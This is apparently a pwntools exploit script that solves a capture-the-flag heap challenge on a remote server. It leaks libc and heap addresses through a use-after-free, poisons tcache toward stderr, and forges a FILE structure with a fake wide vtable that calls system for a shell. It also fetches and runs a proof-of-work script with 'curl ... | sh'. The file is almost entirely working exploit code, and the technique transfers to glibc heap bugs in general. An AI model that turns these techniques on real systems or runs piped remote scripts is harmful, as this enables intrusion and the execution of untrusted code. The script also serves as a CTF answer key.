#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

debug = 1
if args.LOCAL:
    r = process([exe.path])
    if debug:
        gdb.attach(r)
else:
    curl_command = "curl -sSfL https://pwn.red/pow | sh -s "
    r = remote("183.91.11.30", 1943)
    r.recvuntil(b"curl -sSfL https://pwn.red/pow | sh -s ")
    a = r.recvuntil(b"\n", drop=True)
    curl_command += a.decode()

    process = subprocess.Popen(curl_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Get the output and errors (if any)
    stdout, stderr = process.communicate()

    # Decode the output from bytes to string
    output = stdout.decode('utf-8')
    errors = stderr.decode('utf-8')

    r.sendlineafter(b"solution: ", output.encode())

def add_note(r, index, size):
    r.sendlineafter(b"[*] Your choice: ", b"1")
    r.sendlineafter(b"  Index: ", str(index).encode())
    r.sendlineafter(b"Size: ", str(size).encode())

def delete_note(r, index):
    r.sendlineafter(b"[*] Your choice: ", b"2")
    r.sendlineafter(b"  Index: ", str(index).encode())

def write_message(r, index, size, payload):
    r.sendlineafter(b"[*] Your choice: ", b"3")
    r.sendlineafter(b"  Index: ", str(index).encode())
    r.sendlineafter(b"Size: ", str(size).encode())
    sleep(1)
    r.send(payload)

def print_message(r, index):
    r.sendlineafter(b"[*] Your choice: ", b"4")
    r.sendlineafter(b"  Index: ", str(index).encode())

def main():


    add_note(r, 0, 0x500-8)
    add_note(r, 1, 0x20-8)

    delete_note(r, 0)

    print_message(r, 0)
    # good luck pwning :)
    r.recvuntil(b"Data: ")
    libc.address = u64(r.recv(6)+b"\x00\x00")-0x21ace0
    print("[*] libc: ", hex(libc.address))

    add_note(r, 2, 0x20-8)
    add_note(r, 3, 0x20-8)

    delete_note(r, 2)
    delete_note(r, 3)
    print_message(r, 2)

    r.recvuntil(b"Data: ")
    heap = u64(r.recv(5) + b"\x00"*3) << 12
    print("[*] heap: ", hex(heap))

    add_note(r, 0, 0x500-0x20-0x20-8)

    add_note(r, 4, 0x300-8)
    add_note(r, 5, 0x300-8)
    
    delete_note(r, 5)
    delete_note(r, 4)

    heap_chunk_4 = heap + 0x9a0
    file_struct = heap + 0x2a0



    #write_message(r, 4, 8, p64((heap_chunk_4 >> 12)^file_struct))
    #### TESTING

    write_message(r, 4, 8, p64((heap_chunk_4 >> 12)^libc.sym['_IO_2_1_stderr_']))

    ####
    # tcache[size 0x300] -> chunk 4 -> file struct

    _IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
    _IO_wfile_overflow = libc.sym['_IO_wfile_overflow']
    _IO_wdoallocbuf = libc.sym['_IO_wdoallocbuf']
    _IO_2_1_stderr_ = libc.sym['_IO_2_1_stderr_']


    print("[*] _IO_wfile_jumps: ", hex(_IO_wfile_jumps))
    print("[*] _IO_wfile_overflow: ", hex(_IO_wfile_overflow))
    print("[*] _IO_wdoallocbuf: ", hex(_IO_wdoallocbuf))
    print("[*] _IO_2_1_stderr_: ", hex(_IO_2_1_stderr_))
    
    #flag = (0xfbad0000 ^ ~0x2000 ^ ~0x8 ^ ~0x0800 ^ ~0x2) & 0xffffffff
    flag = u64(b'  sh\x00\x00\x00\x00')
    new_vtable = _IO_wfile_jumps

    fake_file_struct = FileStructure(0)
    fake_file_struct.flags = flag
    #fake_file_struct._IO_read_ptr = u64(b"/bin/sh\x00")

    fake_file_struct._IO_write_base = 0
    fake_file_struct._IO_write_ptr = 1

    fake_file_struct._wide_data = heap_chunk_4
    #fake_file_struct._lock = heap + 0x380 
    fake_file_struct.vtable = new_vtable



    fake_wide_vtable_address = heap_chunk_4 + 0x100
    fake_wide_vtable_payload = b"\x00"*0x68
    fake_wide_vtable_payload += p64(libc.sym['system'])

    fake_wide_data_address = heap_chunk_4
    fake_wide_data_payload = b"\x00"*0x20
    fake_wide_data_payload += p64(0) # set _wide_data -> _IO_write_base to 0
    fake_wide_data_payload = fake_wide_data_payload.ljust(0x38, b"\x00")
    fake_wide_data_payload += p64(0) # set _wide_data -> _IO_buf_base to 0
    fake_wide_data_payload = fake_wide_data_payload.ljust(0xe0, b"\x00")
    fake_wide_data_payload += p64(fake_wide_vtable_address)


    full_payload = fake_wide_data_payload.ljust(0x100, b"\x00")
    full_payload += fake_wide_vtable_payload

    add_note(r, 4, 0x300-8)
    write_message(r, 4, 0x200, full_payload)

    add_note(r, 5, 0x300-8)
    write_message(r, 5, 0x200, bytes(fake_file_struct))

    r.sendlineafter(b"[*] Your choice: ", b"6")
    r.interactive()


if __name__ == "__main__":
    main()
